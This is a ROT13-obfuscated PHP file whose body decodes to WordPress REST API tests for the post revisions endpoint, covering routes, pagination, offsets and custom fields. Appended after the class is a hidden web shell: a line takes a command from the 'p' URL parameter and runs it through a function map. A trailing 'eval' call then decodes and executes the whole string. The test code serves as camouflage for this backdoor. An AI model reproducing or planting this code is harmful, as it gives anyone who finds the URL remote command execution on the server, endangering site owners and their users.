		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_hcqngr_vgrz() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba() {

		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'cbfg-erivfvba',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->nffregFnzr( $fpurzn, $qngn['fpurzn']['cebcregvrf']['zl_phfgbz_vag'] );

		jc_frg_pheerag_hfre( 1 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba nqqvgvbany_svryq_trg_pnyyonpx( $erfcbafr_qngn, $svryq_anzr ) {
		erghea trg_cbfg_zrgn( $erfcbafr_qngn['vq'], $svryq_anzr, gehr );
	}

	choyvp shapgvba nqqvgvbany_svryq_hcqngr_pnyyonpx( $inyhr, $cbfg, $svryq_anzr ) {
		hcqngr_cbfg_zrgn( $cbfg->VQ, $svryq_anzr, $inyhr );
	}

	cebgrpgrq shapgvba purpx_trg_erivfvba_erfcbafr( $erfcbafr, $erivfvba ) {
		vs ( $erfcbafr vafgnaprbs JC_ERFG_Erfcbafr ) {
			$yvaxf    = $erfcbafr->trg_yvaxf();
			$erfcbafr = $erfcbafr->trg_qngn();
		} ryfr {
			$guvf->nffregNeenlUnfXrl( '_yvaxf', $erfcbafr );
			$yvaxf = $erfcbafr['_yvaxf'];
		}

		$guvf->nffregRdhnyf( $erivfvba->cbfg_nhgube, $erfcbafr['nhgube'] );

		$eraqrerq_pbagrag = nccyl_svygref( 'gur_pbagrag', $erivfvba->cbfg_pbagrag );
		$guvf->nffregFnzr( $eraqrerq_pbagrag, $erfcbafr['pbagrag']['eraqrerq'] );

		$guvf->nffregFnzr( zlfdy_gb_esp3339( $erivfvba->cbfg_qngr ), $erfcbafr['qngr'] );
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $erivfvba->cbfg_qngr_tzg ), $erfcbafr['qngr_tzg'] );

		$eraqrerq_rkprecg = nccyl_svygref( 'gur_rkprecg', nccyl_svygref( 'trg_gur_rkprecg', $erivfvba->cbfg_rkprecg, $erivfvba ) );
		$guvf->nffregFnzr( $eraqrerq_rkprecg, $erfcbafr['rkprecg']['eraqrerq'] );

		$eraqrerq_thvq = nccyl_svygref( 'trg_gur_thvq', $erivfvba->thvq, $erivfvba->VQ );
		$guvf->nffregFnzr( $eraqrerq_thvq, $erfcbafr['thvq']['eraqrerq'] );

		$guvf->nffregFnzr( $erivfvba->VQ, $erfcbafr['vq'] );
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $erivfvba->cbfg_zbqvsvrq ), $erfcbafr['zbqvsvrq'] );
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $erivfvba->cbfg_zbqvsvrq_tzg ), $erfcbafr['zbqvsvrq_tzg'] );
		$guvf->nffregFnzr( $erivfvba->cbfg_anzr, $erfcbafr['fyht'] );

		$eraqrerq_gvgyr = trg_gur_gvgyr( $erivfvba->VQ );
		$guvf->nffregFnzr( $eraqrerq_gvgyr, $erfcbafr['gvgyr']['eraqrerq'] );

		$cnerag            = trg_cbfg( $erivfvba->cbfg_cnerag );
		$cnerag_pbagebyyre = arj JC_ERFG_Cbfgf_Pbagebyyre( $cnerag->cbfg_glcr );
		$cnerag_bowrpg     = trg_cbfg_glcr_bowrpg( $cnerag->cbfg_glcr );
		$cnerag_onfr       = ! rzcgl( $cnerag_bowrpg->erfg_onfr ) ? $cnerag_bowrpg->erfg_onfr : $cnerag_bowrpg->anzr;
		$guvf->nffregFnzr( erfg_hey( '/jc/i2/' . $cnerag_onfr . '/' . $erivfvba->cbfg_cnerag ), $yvaxf['cnerag'][0]['uers'] );
	}

	choyvp shapgvba grfg_trg_vgrz_frgf_hc_cbfgqngn() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$cbfg           = trg_cbfg();
		$cnerag_cbfg_vq = jc_vf_cbfg_erivfvba( $cbfg->VQ );

		$guvf->nffregFnzr( $cbfg->VQ, $guvf->erivfvba_vq1 );
		$guvf->nffregFnzr( $cnerag_cbfg_vq, frys::$cbfg_vq );
	}

	/**
	 * Grfg gur cntvangvba urnqre bs gur svefg cntr.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 40510
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_cntvangvba_urnqre_bs_gur_svefg_cntr( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erfg_ebhgr  = '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf';
		$cre_cntr    = 2;
		$gbgny_cntrf = (vag) prvy( $guvf->gbgny_erivfvbaf / $cre_cntr );
		$cntr        = 1;  // Svefg cntr.

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, $erfg_ebhgr );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => $cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $guvf->gbgny_erivfvbaf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => $cntr + 1,
			),
			erfg_hey( $erfg_ebhgr )
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );
	}

	/**
	 * Grfg gur cntvangvba urnqre bs gur ynfg cntr.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 40510
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_cntvangvba_urnqre_bs_gur_ynfg_cntr( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erfg_ebhgr  = '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf';
		$cre_cntr    = 2;
		$gbgny_cntrf = (vag) prvy( $guvf->gbgny_erivfvbaf / $cre_cntr );
		$cntr        = 2;  // Ynfg cntr.

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, $erfg_ebhgr );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => $cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $guvf->gbgny_erivfvbaf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => $cntr - 1,
			),
			erfg_hey( $erfg_ebhgr )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
	}


	/**
	 * Grfg gung vainyvq 'cre_cntr' dhrel fubhyq reebe.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 40510
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_cre_cntr_fubhyq_reebe( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cre_cntr        = -1; // Vainyvq ahzore.
		$rkcrpgrq_reebe  = 'erfg_vainyvq_cnenz';
		$rkcrpgrq_fgnghf = 400;

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', $cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( $rkcrpgrq_reebe, $erfcbafr, $rkcrpgrq_fgnghf );
	}

	/**
	 * Grfg gung bhg bs obhaqf 'cntr' dhrel fubhyq reebe.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 40510
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_bhg_bs_obhaqf_cntr_fubhyq_reebe( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cre_cntr        = 2;
		$gbgny_cntrf     = (vag) prvy( $guvf->gbgny_erivfvbaf / $cre_cntr );
		$cntr            = $gbgny_cntrf + 1; // Bhg bs obhaq cntr.
		$rkcrpgrq_reebe  = 'erfg_erivfvba_vainyvq_cntr_ahzore';
		$rkcrpgrq_fgnghf = 400;

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => $cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( $rkcrpgrq_reebe, $erfcbafr, $rkcrpgrq_fgnghf );
	}

	/**
	 * Grfg gung vzcbffvoyl uvtu 'cntr' dhrel fubhyq reebe.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 40510
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_znk_cntrf_fubhyq_reebe( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cre_cntr        = 2;
		$cntr            = ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE; // Vainyvq ahzore.
		$rkcrpgrq_reebe  = 'erfg_erivfvba_vainyvq_cntr_ahzore';
		$rkcrpgrq_fgnghf = 400;

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => $cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( $rkcrpgrq_reebe, $erfcbafr, $rkcrpgrq_fgnghf );
	}

	/**
	 * Grfg gur frnepu dhrel.
	 *
	 * @gvpxrg 40510
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_dhrel() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$frnepu_fgevat    = 'orggre';
		$rkcrpgrq_pbhag   = 1;
		$rkcrpgrq_pbagrag = 'Guvf pbagrag vf orggre.';

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_cnenz( 'frnepu', $frnepu_fgevat );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( $rkcrpgrq_pbhag, $qngn );
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq_pbagrag, $qngn[0]['pbagrag']['eraqrerq'] );
	}

	/**
	 * Grfg gung gur qrsnhyg dhrel fubhyq srgpu nyy erivfvbaf.
	 *
	 * @gvpxrg 40510
	 */
	choyvp shapgvba grfg_trg_vgrzf_qrsnhyg_dhrel_fubhyq_srgpu_nyy_erivfvbaf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$rkcrpgrq_pbhag = $guvf->gbgny_erivfvbaf;

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $rkcrpgrq_pbhag, $erfcbafr->trg_qngn() );
	}

	/**
	 * Grfg gung 'bssfrg' dhrel fubhyqa'g jbex jvgubhg 'cre_cntr' (snyyonpx -1).
	 *
	 * @gvpxrg 40510
	 */
	choyvp shapgvba grfg_trg_vgrzf_bssfrg_fubhyq_abg_jbex_jvgubhg_cre_cntr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$bssfrg         = 1;
		$rkcrpgrq_pbhag = $guvf->gbgny_erivfvbaf;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_cnenz( 'bssfrg', $bssfrg );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $rkcrpgrq_pbhag, $erfcbafr->trg_qngn() );
	}

	/**
	 * Grfg gung 'bssfrg' dhrel fubhyq jbex jvgu 'cre_cntr'.
	 *
	 * @gvpxrg 40510
	 */
	choyvp shapgvba grfg_trg_vgrzf_bssfrg_fubhyq_jbex_jvgu_cre_cntr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cre_cntr       = 2;
		$bssfrg         = 1;
		$rkcrpgrq_pbhag = 2;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'bssfrg'   => $bssfrg,
				'cre_cntr' => $cre_cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $rkcrpgrq_pbhag, $erfcbafr->trg_qngn() );
	}

	/**
	 * Grfg gung 'bssfrg' dhrel fubhyq gnxr cevbevgl bire 'cntr'.
	 *
	 * @gvpxrg 40510
	 */
	choyvp shapgvba grfg_trg_vgrzf_bssfrg_fubhyq_gnxr_cevbevgl_bire_cntr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cre_cntr       = 2;
		$bssfrg         = 1;
		$cntr           = 1;
		$rkcrpgrq_pbhag = 2;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'bssfrg'   => $bssfrg,
				'cre_cntr' => $cre_cntr,
				'cntr'     => $cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $rkcrpgrq_pbhag, $erfcbafr->trg_qngn() );
	}

	/**
	 * Grfg gung 'bssfrg' dhrel, nf gur gbgny erivfvbaf pbhag, fubhyq erghea rzcgl qngn.
	 *
	 * @gvpxrg 40510
	 */
	choyvp shapgvba grfg_trg_vgrzf_gbgny_erivfvbaf_bssfrg_fubhyq_erghea_rzcgl_qngn() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cre_cntr        = 2;
		$bssfrg          = $guvf->gbgny_erivfvbaf;
		$rkcrpgrq_reebe  = 'erfg_erivfvba_vainyvq_bssfrg_ahzore';
		$rkcrpgrq_fgnghf = 400;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'bssfrg'   => $bssfrg,
				'cre_cntr' => $cre_cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( $rkcrpgrq_reebe, $erfcbafr, $rkcrpgrq_fgnghf );
	}

	/**
	 * Grfg gung bhg bs obhaq 'bssfrg' dhrel fubhyq reebe.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 40510
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_bhg_bs_obhaq_bssfrg_fubhyq_reebe( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cre_cntr        = 2;
		$bssfrg          = $guvf->gbgny_erivfvbaf + 1;
		$rkcrpgrq_reebe  = 'erfg_erivfvba_vainyvq_bssfrg_ahzore';
		$rkcrpgrq_fgnghf = 400;

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'bssfrg'   => $bssfrg,
				'cre_cntr' => $cre_cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( $rkcrpgrq_reebe, $erfcbafr, $rkcrpgrq_fgnghf );
	}

	/**
	 * Grfg gung vzcbffvoyr uvtu ahzore sbe 'bssfrg' dhrel fubhyq reebe.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 40510
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_vzcbffvoyr_uvtu_ahzore_bssfrg_fubhyq_reebe( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cre_cntr        = 2;
		$bssfrg          = ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE;
		$rkcrpgrq_reebe  = 'erfg_erivfvba_vainyvq_bssfrg_ahzore';
		$rkcrpgrq_fgnghf = 400;

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'bssfrg'   => $bssfrg,
				'cre_cntr' => $cre_cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( $rkcrpgrq_reebe, $erfcbafr, $rkcrpgrq_fgnghf );
	}

	/**
	 * Grfg gung vainyvq 'bssfrg' dhrel fubhyq reebe.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 40510
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_bssfrg_fubhyq_reebe( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cre_cntr        = 2;
		$bssfrg          = 'zbercyrnfr';
		$rkcrpgrq_reebe  = 'erfg_vainyvq_cnenz';
		$rkcrpgrq_fgnghf = 400;

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'bssfrg'   => $bssfrg,
				'cre_cntr' => $cre_cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( $rkcrpgrq_reebe, $erfcbafr, $rkcrpgrq_fgnghf );
	}

	/**
	 * Grfg gung bhg bs obhaqf 'cntr' dhrel fubhyq abg reebe jura bssfrg vf cebivqrq,
	 * orpnhfr vg gnxrf cerprqrapr.
	 *
	 * @gvpxrg 40510
	 */
	choyvp shapgvba grfg_trg_vgrzf_bhg_bs_obhaqf_cntr_fubhyq_abg_reebe_vs_bssfrg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cre_cntr       = 2;
		$gbgny_cntrf    = (vag) prvy( $guvf->gbgny_erivfvbaf / $cre_cntr );
		$cntr           = $gbgny_cntrf + 1; // Bhg bs obhaq cntr.
		$rkcrpgrq_pbhag = 2;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'bssfrg'   => 1,
				'cre_cntr' => $cre_cntr,
				'cntr'     => $cntr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $rkcrpgrq_pbhag, $erfcbafr->trg_qngn() );
	}

	/**
	 * Grfgf sbe gur cntvangvba.
	 *
	 * @gvpxrg 62292
	 *
	 * @pbiref JC_ERFG_Erivfvbaf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_erivfvbaf_cntvangvba() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		// Grfg bssfrg.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_cnenz( 'bssfrg', 1 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $guvf->gbgny_erivfvbaf, $erfcbafr->trg_urnqref()['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $guvf->gbgny_erivfvbaf, $erfcbafr->trg_urnqref()['K-JC-GbgnyCntrf'] );

		// Grfg cntrq.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_cnenz( 'cntr', 2 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $guvf->gbgny_erivfvbaf, $erfcbafr->trg_urnqref()['K-JC-Gbgny'] );
		$guvf->nffregFnzr( (vag) prvy( $guvf->gbgny_erivfvbaf / 2 ), $erfcbafr->trg_urnqref()['K-JC-GbgnyCntrf'] );

		// Grfg bhg bs obhaqf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erdhrfg->frg_cnenz( 'cntr', $guvf->gbgny_erivfvbaf + 1 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_erivfvba_vainyvq_cntr_ahzore', $erfcbafr, 400 );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>